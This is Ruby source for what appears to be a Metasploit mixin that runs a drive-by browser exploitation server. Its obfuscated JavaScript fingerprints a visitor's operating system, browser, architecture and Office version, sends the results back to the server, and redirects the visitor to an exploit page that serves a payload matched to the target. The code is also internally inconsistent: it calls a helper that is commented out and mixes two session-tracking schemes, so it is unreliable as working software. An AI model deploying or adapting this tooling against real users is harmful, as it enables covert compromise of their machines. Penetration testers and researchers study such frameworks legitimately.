# -*- coding: binary -*-

require 'erb'
require 'cgi'
require 'rex/exploitation/js'

module Msf

###
#
# The BrowserExploitServer mixin provides methods to acheive common tasks seen in modern browser
# exploitation, and is designed to work against common setups such as on Windows, OSX, and Linux.
#
###


module Exploit::Remote::BrowserExploitServer

    include Msf::Exploit::Remote::HttpServer
    include Msf::Exploit::Remote::HttpServer::HTML
    include Msf::Exploit::RopDb
    include Msf::Exploit::Remote::Browser::SessionStore

    HTTP_PROXY_HEADERS = [
      'HTTP_VIA', 'HTTP_X_FORWARDED_FOR', 'HTTP_FORWARDED_FOR', 'HTTP_X_FORWARDED',
      'HTTP_FORWARDED', 'HTTP_CLIENT_IP', 'HTTP_FORWARDED_FOR_IP', 'VIA', 'X_FORWARDED_FOR',
      'FORWARDED_FOR', 'X_FORWARDED', 'FORWARDED', 'CLIENT_IP', 'FORWARDED_FOR_IP',
      'HTTP_PROXY_CONNECTION'
    ]

    def initialize(info={})
      super

      @target_profiles = []

      # Requirements are conditions that the browser must have in order to be exploited.
      # They must be defined by the module, and the mixin should check them before the
      # exploit is actually deployed.
      @requirements = {}

      @info_receiver_page     = "info"
      @exploit_receiver_page  = "exploit"
      @noscript_receiver_page = "noscript"

    register_options(
      [
        OptBool.new('Retries', [false,  "Allow the browser to retry the module", true])
      ], Exploit::Remote::BrowserExploitServer)
    end

    #
    # Returns the resource (URI) to the module
    # Similar to get_resource, this method will allow whatever is requesting this URI to access
    # on_request_exploit
    #
    def get_module_resource
      "#{get_resource.chomp("/")}/#{@exploit_receiver_page}"
    end

    #
    # Defines requirements by the module.
    # The keys the module can define are the same as the ones in @target_profiles
    #
    def requirements(reqs={})
      @requirements = reqs
    end

    #
    # Returns an array of items that do not meet the requirements
    #
    def has_bad_requirements?(target_profile)
      profile = target_profile[target_profile.first[0]]
      bad_reqs = []

      @requirements.each do |k, v|
        if v.class == Regexp
          bad_reqs << k if profile[k] !~ v
        else
          bad_reqs << k if profile[k] != v
        end
      end

      bad_reqs
    end

    #
    # Retrieves a tag.
    # First it obtains the tag from the browser's "Cookie" header.
    # If the header is empty (possible if the browser has cookies disabled),
    # then it will return a tag based on IP + the user-agent.
    #
    # def retrieve_tag(request)
    #   tag = request.headers['Cookie'].to_s

    #   if tag.blank?
    #     # Browser probably doesn't allow cookies, plan B :-/
    #     ip = cli.peerhost
    #     os = request.headers['User-Agent']
    #     tag = Rex::Text.md5("#{ip}#{os}")
    #   end

    #   tag
    # end

    #
    # Registers target information to @target_profiles
    # Acceptable sources include :script, and :headers
    #
    def process_browser_info(source, cli, request)
      tag = retrieve_tag(request)

      # Gathering target info from the detection stage
      case source
      when :script
        # Gathers target data from a POST request
        # update_profile(target_profile, :source, 'script')
        cli.session[:source] = 'script'
        raw = Rex::Text.decode_base64(Rex::Text.uri_decode(request.body))
        post_data = CGI::parse(raw)
        cli.session.set(post_data)

      when :headers
        # Gathers target data from headers
        # This may be less accureate, and most likely less info.
        fp = fingerprint_user_agent(request.headers['User-Agent'])
        # Module has all the info it needs, ua_string is kind of pointless.
        # Kill this to save space.
        fp.delete(:ua_string)
        cli.session[:source] = :headers
        cli.session.set(fp)
      end

      # Other detections
      if cli.session[:proxy].blank?
        cli.session[:proxy] = has_proxy?(request)
      end

      if cli.session[:language].blank?
        cli.session[:language] = request.headers['Accept-Language']
      end

      report_client({
        :host      => cli.peerhost,
        :ua_string => request.headers['User-Agent'],
        :ua_name   => target_profile[tag]['ua_name'],
        :ua_ver    => target_profile[tag]['ua_ver']
      })
    end

    #
    # Checks if the target is running a proxy
    #
    def has_proxy?(request)
      HTTP_PROXY_HEADERS.any? do |match|
        request.headers.any? { |k, v| k.include?(match) }
      end
    end

    #
    # Returns the code for client-side detection
    #
    def get_detection_html
      js = ::Rex::Exploitation::JSObfu.new %Q|
      #{js_base64}
      #{js_os_detect}
      #{js_addons_detect}
      #{js_ajax_post}

      function objToQuery(obj) {
        var q = [];
        for (var key in obj) {
          q.push(key + '=' + obj[key]);
        }
        return escape(Base64.encode(q.join('&')));
      }

      window.onload = function() {
        var osInfo = window.os_detect.getVersion();
        var d = {
          os_name:   osInfo.os_name,
          os_flavor: osInfo.os_flavor,
          ua_name:   osInfo.ua_name,
          ua_ver:    osInfo.ua_version,
          arch:      osInfo.arch,
          office:    window.addons_detect.getMsOfficeVersion()
        };
        var query = objToQuery(d);
        postInfo("#{get_resource.chomp("/")}/#{@info_receiver_page}/", query);
        window.location = "#{get_resource.chomp("/")}/#{@exploit_receiver_page}/";
      };
      |

      js.obfuscate

      %Q|
      <html>
      <body>
      <script>
      #{js}
      </script>
      <noscript>
      <img style="visibility:hidden" src="#{get_resource.chomp("/")}/#{@noscript_receiver_page}/">
      <meta http-equiv="refresh" content="1; url=#{get_resource.chomp("/")}/#{@exploit_receiver_page}/">
      </noscript>
      </body>
      </html>
      |
    end

    #
    # Handles exploit stages.
    #
    def on_request_uri(cli, request)
      case request.uri
      when /^#{get_resource}$/
        #
        # This is the information gathering stage
        #
        if get_profile(retrieve_tag(request))
          send_redirect(cli, "#{get_resource.chomp("/")}/#{@exploit_receiver_page}")
          return
        end

        print_status("Gathering target information.")
        tag = Rex::Text.rand_text_alpha(rand(20) + 5)
        init_profile(tag)
        html = get_detection_html
        send_response(cli, html, {'Set-Cookie' => tag})

      when /#{@info_receiver_page}/
        #
        # The detection code will hit this if Javascript is enabled
        #
        process_browser_info(source=:script, cli, request)
        send_response(cli, '')

      when /#{@noscript_receiver_page}/
        #
        # The detection code will hit this instead of Javascript is disabled
        # Should only be triggered by the img src in <noscript>
        #
        process_browser_info(source=:headers, cli, request)
        send_not_found(cli)

      when /#{@exploit_receiver_page}/
        #
        # This sends the actual exploit. A module should define its own
        # on_request_exploit() to get the target information
        #
        tag = retrieve_tag(request)
        profile = get_profile(tag)
        if profile[tag][:tried] and datastore['Retries'] == false
          print_status("Target with tag \"#{tag}\" wants to retry the module, not allowed.")
          send_not_found(cli)
        else
          update_profile(profile, :tried, true)
          bad_reqs = has_bad_requirements?(profile)
          if bad_reqs.empty?
            method(:on_request_exploit).call(cli, request, profile)
          else
            print_error("Exploit requirement(s) not met: #{bad_reqs * ', '}")
            send_not_found(cli)
          end
        end

      else
        send_not_found(cli)
      end
    end

    #
    # Overriding method. The module should override this.
    #
    def on_request_exploit(cli, request, browser_info)
    end

    #
    # Converts an ERB-based exploit template into HTML, and sends to client
    #
    def send_exploit_html(cli, template, headers={})
      html = ERB.new(template).result
      send_response(cli, html)
    end

    #
    # Generates a target-specific payload.
    # Should be called by the module.
    #
    def get_payload(cli, browser_info)
      tag      = browser_info.first[0]
      arch     = browser_info[tag][:arch]
      platform = browser_info[tag][:os_name]

      # Fix names for consisntecy so our API can find the right one
      # Originally defined in lib/msf/core/constants.rb
      platform = platform.gsub(/^Mac OS X$/, 'OSX')
      platform = platform.gsub(/^Microsoft Windows$/, 'Windows')

      regenerate_payload(cli, platform, arch).encoded
    end

  end
end
